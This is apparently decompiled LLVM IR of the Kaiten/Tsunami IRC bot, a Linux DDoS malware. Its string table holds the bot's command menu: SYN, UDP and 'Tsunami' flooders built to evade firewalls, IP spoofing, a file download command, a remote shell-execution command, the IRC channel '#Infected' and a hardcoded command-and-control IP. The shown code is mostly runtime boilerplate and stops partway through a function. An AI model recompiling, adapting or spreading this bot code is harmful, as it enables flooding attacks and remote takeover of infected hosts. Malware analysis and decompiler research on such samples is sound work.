source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }
%timespec = type { i32, i32 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805e578.21 = global i32 0
@global_var_805e5a4.22 = local_unnamed_addr global i32* @global_var_805e578.21
@global_var_805d564.23 = constant i32 0
@global_var_8062e04.24 = global i32 0
@global_var_805e57c.25 = local_unnamed_addr global i32 0
@global_var_80678c8.28 = local_unnamed_addr global i32 0
@global_var_805a6ef.29 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_8062e30.30 = local_unnamed_addr global i32 0
@global_var_80679ec.31 = local_unnamed_addr global i32 0
@1 = constant i32 1966014578
@global_var_805a70f.35 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_80678c0.36 = local_unnamed_addr global i32 0
@global_var_805a71f.37 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805a738.38 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_805a75c.39 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_805a781.40 = constant [8 x i8] c"http://\00"
@global_var_805a78c.41 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_805a7b4.42 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_805a7dc.43 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_805a8f0.44 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_805a90c.45 = constant [3 x i8] c"wb\00"
@global_var_805a90f.46 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_805a914.47 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_805a92c.48 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_805a94c.49 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_805a97a.50 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_805a997.51 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_805a9b0.52 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_805a9e5.53 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_805a9ee.54 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_805aa30.57 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_805aa53.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_805aa74.59 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_80677c0.60 = global i32 0
@global_var_805aa9c.61 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_805aabb.62 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_805aad5.63 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_805aaf2.64 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_805ab0d.65 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_805ab2c.66 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_805ab4c.67 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8063240.68 = global i32 0
@global_var_805ab98.69 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_805abbc.70 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_805abe3.71 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_805ac00.72 = constant i32 2
@global_var_805ac50.73 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_805ac77.74 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_805ac90.75 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_805acb4.76 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_805acd8.77 = constant [36 x i8] c"NOTICE %s :UNKNOWN <target> <secs>\0A\00"
@global_var_805acfc.78 = constant [27 x i8] c"NOTICE %s :Unknowning %s.\0A\00"
@global_var_805ad17.79 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_80679e0.80 = local_unnamed_addr global i32 0
@global_var_8062e20.81 = local_unnamed_addr global i32 0
@global_var_805ad34.82 = constant [119 x i8] c"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\0A\00"
@global_var_805adac.83 = constant [123 x i8] c"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_805ae28.84 = constant [77 x i8] c"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\0A\00"
@global_var_805ae78.85 = constant [93 x i8] c"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\0A\00"
@global_var_805aed8.86 = constant [94 x i8] c"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\0A\00"
@global_var_805af38.87 = constant [79 x i8] c"NOTICE %s :SERVER <server>                                  = Changes servers\0A\00"
@global_var_805af88.88 = constant [89 x i8] c"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\0A\00"
@global_var_805afe4.89 = constant [92 x i8] c"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\0A\00"
@global_var_805b040.90 = constant [103 x i8] c"NOTICE %s :DISABLE                                          = Disables all packeting from this client\0A\00"
@global_var_805b0a8.91 = constant [102 x i8] c"NOTICE %s :ENABLE                                           = Enables all packeting from this client\0A\00"
@global_var_805b110.92 = constant [80 x i8] c"NOTICE %s :KILL                                             = Kills the client\0A\00"
@global_var_805b160.93 = constant [117 x i8] c"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_805b1d8.94 = constant [90 x i8] c"NOTICE %s :VERSION                                          = Requests version of client\0A\00"
@global_var_805b234.95 = constant [91 x i8] c"NOTICE %s :KILLALL                                          = Kills all current packeting\0A\00"
@global_var_805b290.96 = constant [77 x i8] c"NOTICE %s :HELP                                             = Displays this\0A\00"
@global_var_805b2e0.97 = constant [96 x i8] c"NOTICE %s :IRC <command>                                    = Sends this command to the server\0A\00"
@global_var_805b340.98 = constant [82 x i8] c"NOTICE %s :SH <command>                                     = Executes a command\0A\00"
@global_var_805b392.99 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_80679e8.100 = local_unnamed_addr global i32 0
@global_var_80678c4.101 = local_unnamed_addr global i32 0
@global_var_805b410.102 = constant [5 x i8] c"IRC \00"
@global_var_805b415.103 = constant [4 x i8] c"%s\0A\00"
@global_var_805b419.104 = constant [4 x i8] c"SH \00"
@global_var_805b420.105 = constant [60 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_805b45c.106 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_805b46b.107 = constant i32 1330446336
@global_var_805b3ae.108 = constant [8 x i8] c"TSUNAMI\00"
@global_var_805e5e0.109 = local_unnamed_addr global [8 x i8]* @global_var_805b3ae.108
@global_var_805e5e4.110 = local_unnamed_addr global i32 134519896
@global_var_805b46d.111 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_80679e4.112 = local_unnamed_addr global i32 0
@global_var_805b47a.113 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_805b487.114 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_805b48f.115 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_805b498.116 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_805a6e0.121 = constant [15 x i8] c"174.138.51.250\00"
@global_var_805e5c4.122 = global [15 x i8]* @global_var_805a6e0.121
@global_var_805b512.123 = constant [6 x i8] c"-bash\00"
@global_var_80678cc.124 = local_unnamed_addr global i32 0
@global_var_805b518.125 = constant [10 x i8] c"#Infected\00"
@global_var_805b522.126 = constant [5 x i8] c"bleh\00"
@global_var_805b528.127 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_805b551.128 = constant i32 1380253706
@global_var_805b4f5.129 = constant [4 x i8] c"352\00"
@global_var_805e660.130 = global [4 x i8]* @global_var_805b4f5.129
@global_var_805e664.131 = global i32 134523698
@global_var_805b553.132 = constant [6 x i8] c"ERROR\00"
@global_var_806338c.133 = local_unnamed_addr global i32 0
@global_var_80626c0 = external global i32
@global_var_8063390.134 = local_unnamed_addr global i32 0
@global_var_8063394.135 = local_unnamed_addr global i32 0
@global_var_80628a0.136 = global i32 0
@global_var_80679f0.137 = local_unnamed_addr global i32 0
@global_var_80628b8.138 = local_unnamed_addr global i32 0
@global_var_80628b4.139 = local_unnamed_addr global i32 0
@global_var_8063244.140 = local_unnamed_addr global i32 0
@global_var_8063248.141 = local_unnamed_addr global i32 0
@global_var_8062a84.142 = local_unnamed_addr global i32 -1
@global_var_8062a80.143 = local_unnamed_addr global i32* @global_var_80626c0
@global_var_8067a00.144 = local_unnamed_addr global i32 0
@global_var_8062a90.145 = local_unnamed_addr global i32 34
@global_var_805e6a0.146 = global i32 0
@global_var_80626a0.147 = local_unnamed_addr global i32 2
@global_var_80679f4.148 = local_unnamed_addr global i32 0
@global_var_80679fc.149 = local_unnamed_addr global i32 0
@global_var_80628e8.150 = global i32 0
@global_var_80628e4.151 = local_unnamed_addr global i32* @global_var_80628e8.150
@global_var_80628ec.152 = local_unnamed_addr global i32 0
@global_var_80628f0.153 = global i32 0
@global_var_8062a8c.154 = local_unnamed_addr global i32 33
@global_var_8062a98.155 = local_unnamed_addr global i32 134535125
@global_var_8067654.156 = local_unnamed_addr global i32 0
@global_var_806324c.157 = local_unnamed_addr global i32 0
@global_var_8063398.158 = local_unnamed_addr global i32 0
@global_var_806339c.159 = local_unnamed_addr global i32 0
@global_var_805e6b0.160 = global i32 0
@global_var_80628bc.161 = local_unnamed_addr global i32* @global_var_805e6b0.160
@global_var_8063250.162 = global i32 0
@global_var_8063268.163 = global i32 0
@global_var_806326c.164 = global i32 0
@global_var_8063270.165 = global i32 0
@global_var_8062cb0.166 = global i32 0
@global_var_804c814.167 = constant i32 -2062498685
@global_var_8063280.168 = global i32 0
@global_var_804c86c.169 = constant i32 -2057255805
@global_var_8062a88.170 = local_unnamed_addr global i32 32
@global_var_8063388.171 = global i32 0
@global_var_8063384.172 = local_unnamed_addr global i32 0
@global_var_8062b58.173 = local_unnamed_addr global i32 35
@global_var_8062b5c.174 = local_unnamed_addr global i32 64
@global_var_80633a4.175 = local_unnamed_addr global i32 0
@global_var_805e6c0.176 = global i32 0
@global_var_8067a08.177 = local_unnamed_addr global i32 0
@global_var_80653f8.178 = global i32 0
@global_var_80653fc.179 = global i32 0
@global_var_8062704.180 = local_unnamed_addr global i32* @global_var_80653f8.178
@global_var_806270c.181 = local_unnamed_addr global i32* @global_var_80653fc.179
@global_var_8062bb0.182 = local_unnamed_addr global i32 2
@global_var_80626d4.183 = local_unnamed_addr global i32 0
@global_var_8062b7c.185 = global i32* bitcast (i16* @global_var_8062bc0.184 to i32*)
@global_var_80633a0.186 = local_unnamed_addr global i32 0
@global_var_8067a04.187 = local_unnamed_addr global i32 0
@global_var_806285c.188 = local_unnamed_addr global i32 0
@global_var_8062a4c.190 = local_unnamed_addr global i32 0
@global_var_8062a48.191 = local_unnamed_addr global i32 0
@global_var_80628b0.192 = local_unnamed_addr global i32 0
@global_var_80633a8.193 = global i32 0
@global_var_80633c0.194 = global i32 0
@global_var_80633cc.195 = local_unnamed_addr global i32 0
@global_var_804f3fa.196 = constant [4 x i8] c"XZj\00"
@global_var_80633e0.197 = global i32 0
@global_var_80633e4.198 = global i32 0
@global_var_80653e0.199 = global i32 0
@global_var_8062b98.203 = global i32 0
@global_var_806541c.204 = local_unnamed_addr global i32 0
@global_var_8065420.205 = local_unnamed_addr global i32 0
@global_var_8065400.206 = global i32 0
@global_var_8065418.207 = local_unnamed_addr global i32 0
@global_var_805b8a0.208 = constant [3 x i8] c"-c\00"
@global_var_805b8a8.209 = constant [3 x i8] c"sh\00"
@global_var_805b8a3.210 = constant [8 x i8] c"/bin/sh\00"
@global_var_8062b80.211 = global i32 0
@global_var_805b8ac.212 = constant i32 0
@global_var_805b8c4.213 = constant [6 x i8] c"(nil)\00"
@global_var_805b8ca.214 = constant [7 x i8] c"(null)\00"
@global_var_805b8d1.215 = constant i32 2949163
@global_var_805b93e.217 = constant i32 327688
@global_var_8062dc0 = external local_unnamed_addr global i32
@global_var_805cb80.219 = constant i32 65536
@global_var_805b936.220 = constant [8 x i8] c" +0-#'I\00"
@global_var_805b8e4.221 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805b921.222 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805b917.223 = constant i32 117506048
@global_var_805b908.224 = constant i32 331776
@global_var_805b980.225 = constant [8 x i8] c"Success\00"
@global_var_805b962.226 = constant [15 x i8] c"Unknown error \00"
@global_var_8062dc8.227 = local_unnamed_addr global i32* @global_var_805cb80.219
@global_var_8067440.228 = global i32 0
@global_var_8067460.229 = global i32 0
@global_var_806762c.230 = global i32 0
@global_var_8062de8.231 = global i32 0
@global_var_8067e60.232 = local_unnamed_addr global i32 0
@global_var_8067e54.233 = global i32 0
@global_var_8067a4c.235 = global i32 0
@global_var_8067a50.236 = local_unnamed_addr global i32 0
@global_var_8067a54.237 = global i32 0
@global_var_8067a60.238 = local_unnamed_addr global i32 0
@global_var_8067d54.239 = global i32 0
@global_var_8067d7c.240 = local_unnamed_addr global i32 0
@global_var_8067d6c.241 = local_unnamed_addr global i32 0
@global_var_8067d70.242 = local_unnamed_addr global i32 0
@global_var_8067d74.243 = local_unnamed_addr global i32 0
@global_var_8067d90.244 = local_unnamed_addr global i32 0
@global_var_8067d78.245 = local_unnamed_addr global i32 0
@global_var_8067d84.246 = local_unnamed_addr global i32 0
@global_var_8067d88.247 = local_unnamed_addr global i32 0
@global_var_8067d94.248 = local_unnamed_addr global i32 0
@global_var_8067d68.249 = local_unnamed_addr global i32 0
@global_var_8067d64.251 = local_unnamed_addr global i32 0
@global_var_8067d8c.252 = local_unnamed_addr global i32 0
@global_var_8067a5c.253 = local_unnamed_addr global i32 0
@global_var_8062cc8.254 = global i32 0
@global_var_8062ce0.256 = global i32 0
@global_var_8062cf8 = external global i32
@global_var_8062d24.258 = global i32 -1726662223
@global_var_8062d00.259 = local_unnamed_addr global i32* @global_var_8062d24.258
@global_var_8062cfc.260 = global i32* @global_var_8062d24.258
@global_var_805c4f4.261 = constant i32 0
@global_var_805c4e0.262 = constant i32 0
@global_var_8062da0.263 = global i32 0
@global_var_8067644.264 = local_unnamed_addr global i32 0
@global_var_8067650.265 = local_unnamed_addr global i32 0
@global_var_8067648.267 = global i32 0
@global_var_805e568.268 = global i32 -1
@global_var_805413b.269 = constant i32 -294069
@global_var_8067658.270 = local_unnamed_addr global i32 0
@global_var_806765c.271 = local_unnamed_addr global i32 0
@global_var_805c760.272 = constant [10 x i8] c"/dev/null\00"
@global_var_806764c.274 = local_unnamed_addr global i32 0
@global_var_8054323.276 = constant i32 1928542531
@global_var_8054347.277 = constant i32 1928542531
@global_var_8067680.278 = global i32 0
@global_var_8067664.280 = global i32 0
@global_var_8067e2c.281 = global i32 0
@global_var_8067e40.282 = global i32 0
@global_var_8067e30.283 = global i32 0
@global_var_8067da0.284 = global i32 0
@global_var_80677a8.285 = local_unnamed_addr global i32 0
@global_var_805cd90.287 = constant [4 x i8] c"inf\00"
@global_var_805cd93.292 = constant i32 1179535616
@global_var_805cda0.293 = constant i32 2883630
@global_var_8062b70 = external local_unnamed_addr global i32
@global_var_805ce98.295 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_8062dcc.296 = global i32 134568653
@global_var_8067e20.297 = global i32 0
@global_var_8067748.298 = global i32 0
@global_var_8067764.300 = global i32 0
@global_var_805cee0.306 = constant i32 0
@global_var_805cef8.307 = constant i32 134573169
@global_var_805cf04.308 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_806777c.309 = global i32 0
@global_var_805cf5d.310 = constant i32 0
@global_var_805cf28.311 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_805cf43.312 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_805cf80.313 = constant i32 134575572
@global_var_8067e64.317 = local_unnamed_addr global i32 0
@global_var_805cfa8.318 = constant i32 1697579054
@global_var_805cfdc.319 = constant i32 1868824690
@global_var_805cfaa.320 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805cfbb.321 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805cfd3.322 = constant [11 x i8] c"nameserver\00"
@global_var_805cfde.323 = constant [7 x i8] c"domain\00"
@global_var_805cfe5.324 = constant [7 x i8] c"search\00"
@global_var_8067e44.325 = global i32 0
@global_var_8067e80.326 = global i32 0
@global_var_806779c.327 = local_unnamed_addr global i32 0
@global_var_8058582.328 = constant i32 -1592736637
@global_var_80677a0.329 = local_unnamed_addr global i32 0
@global_var_80677a4.330 = local_unnamed_addr global i32 0
@global_var_8067f00.331 = local_unnamed_addr global i32 0
@global_var_8067f04.332 = local_unnamed_addr global i32 0
@global_var_805cfec.333 = constant i32 134581972
@global_var_805d000.336 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_805d018.337 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_805d04d.338 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_805d064.343 = constant [24 x i8] c"Cannot register service\00"
@global_var_80677b0.344 = local_unnamed_addr global i32 0
@global_var_805d08c.345 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_805d0ba.346 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805d0b7.348 = constant [3 x i8] c"%x\00"
@global_var_805d0cb.349 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805d0d6.350 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805d10c.351 = constant [3 x i8] c": \00"
@global_var_805d10e.352 = constant i32 539828224
@global_var_805d0e8.353 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_805d300.354 = constant i32 0
@global_var_805d304.355 = constant i32 0
@global_var_805d3a0.356 = constant [13 x i8] c"RPC: Success\00"
@global_var_805d0f0.357 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_805d10a.358 = constant [5 x i8] c"%s: \00"
@global_var_805d10f.359 = constant [4 x i8] c" - \00"
@global_var_805d113.361 = constant [13 x i8] c"; errno = %s\00"
@global_var_805d1e4.362 = constant i32 0
@global_var_805d220.363 = constant [18 x i8] c"Authentication OK\00"
@global_var_805d1e0.364 = constant i32 0
@global_var_805d148.365 = constant [9 x i8] c"; why = \00"
@global_var_805d151.366 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_805d120.367 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_805d175.368 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_805e56c.369 = global i32 134535733
@global_var_8062e00.20 = local_unnamed_addr global i8 0
@global_var_8062e40.26 = external global i8*
@global_var_8062e24.27 = local_unnamed_addr global i8 0
@global_var_8062e28.32 = external global i8*
@global_var_8062e2c.33 = local_unnamed_addr global i64 0
@global_var_8062e2b.117 = external local_unnamed_addr global i8*
@global_var_8062e2a.118 = external local_unnamed_addr global i8*
@global_var_8062e29.119 = external global i8*
@global_var_805e5c0.120 = local_unnamed_addr global i64 578051608189861892
@global_var_8062bc0.184 = global i16 288
@global_var_8062860.189 = local_unnamed_addr global i8 0
@global_var_8062c10.201 = local_unnamed_addr global i16 272
@global_var_805b956.216 = external constant i8*
@global_var_8067a20.234 = global i8 0
@global_var_8067d80.250 = local_unnamed_addr global i8 0
@global_var_8067640.255 = local_unnamed_addr global i8 0
@global_var_8067660.273 = local_unnamed_addr global i8 0
@global_var_805cdc0.290 = constant x86_fp80* null
@global_var_8067760.299 = local_unnamed_addr global i8 0
@global_var_8067780.314 = external global i8*
@global_var_8067798.315 = local_unnamed_addr global i64 0
@global_var_8062de4.316 = local_unnamed_addr global i16 1
@global_var_80677ac.334 = local_unnamed_addr global i16 0
@global_var_80677ad.335 = global i8 0
@global_var_805a70d.34 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 91363
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8062e00.20, align 512
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805e5a4.22 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805e5a4.22 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805e5a4.22 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8062e00.20, align 512
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805e5a4.22 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8062e00.20, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805d564.23 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_805e57c.25, align 4
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134525091, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134588100, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818f = load i32, i32* @ebx, align 4
  store i32 %v0_804818f, i32* %stack_var_-8, align 4
  %v4_8048193 = ptrtoint i8* %arg1 to i32
  %v2_8048196 = load i8, i8* %arg1, align 1
  %v12_804819f = icmp eq i8 %v2_8048196, 42
  br i1 %v12_804819f, label %dec_label_pc_80481c7, label %dec_label_pc_80481a5

dec_label_pc_80481a5:                             ; preds = %entry
  %v12_80481a5 = icmp eq i8 %v2_8048196, 63
  br i1 %v12_80481a5, label %dec_label_pc_804821a, label %dec_label_pc_80481ab

dec_label_pc_80481ab:                             ; preds = %dec_label_pc_80481a5
  %v4_80481ab = icmp eq i8 %v2_8048196, 0
  br i1 %v4_80481ab, label %dec_label_pc_80481b6, label %dec_label_pc_8048254

dec_label_pc_80481b6:                             ; preds = %dec_label_pc_80481ab
  %v2_80481b9 = load i8, i8* %tmp12, align 1
  %v2_80481bc = sext i8 %v2_80481b9 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c7:                             ; preds = %entry
  %v1_80481ca = add i32 %v4_8048193, 1
  store i32 %arg2, i32* @edx, align 4
  %v4_80481d2 = inttoptr i32 %v1_80481ca to i8*
  %v5_80481d5 = call i32 @strwildmatch(i8* %v4_80481d2, i32 %arg2)
  %v1_80481da = icmp eq i32 %v5_80481d5, 0
  br i1 %v1_80481da, label %dec_label_pc_8048208, label %dec_label_pc_80481de

dec_label_pc_80481de:                             ; preds = %dec_label_pc_80481c7
  %v2_80481e1 = load i8, i8* %tmp12, align 1
  %v4_80481e4 = icmp eq i8 %v2_80481e1, 0
  br i1 %v4_80481e4, label %dec_label_pc_804820f, label %dec_label_pc_80481e8

dec_label_pc_80481e8:                             ; preds = %dec_label_pc_80481de
  %v1_80481eb = add i32 %arg2, 1
  %v5_80481f6 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_80481eb)
  %v1_80481fb = icmp eq i32 %v5_80481f6, 0
